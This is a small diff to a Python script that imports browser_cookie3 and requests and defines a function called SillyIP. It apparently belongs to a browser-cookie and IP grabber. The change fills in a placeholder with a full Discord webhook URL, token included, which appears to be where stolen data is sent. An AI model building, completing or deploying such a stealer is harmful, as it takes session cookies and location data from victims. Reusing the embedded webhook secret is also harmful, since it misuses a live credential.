@@ -2,7 +2,7 @@ import os
 import requests
 import browser_cookie3
 
-webhook_url = "WEBHOOK HERE!!!!!"
+webhook_url = "https://discord.com/api/webhooks/1399933451825709158/RI6Zq-KVoOBng5lBDAjrPUWduR6BKYsP1t7Ed4TSmSLge0FKwpsHMwXSQnJDYYvGnIEX"
 
 def SillyIP():
     try:
@@ -76,3 +76,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
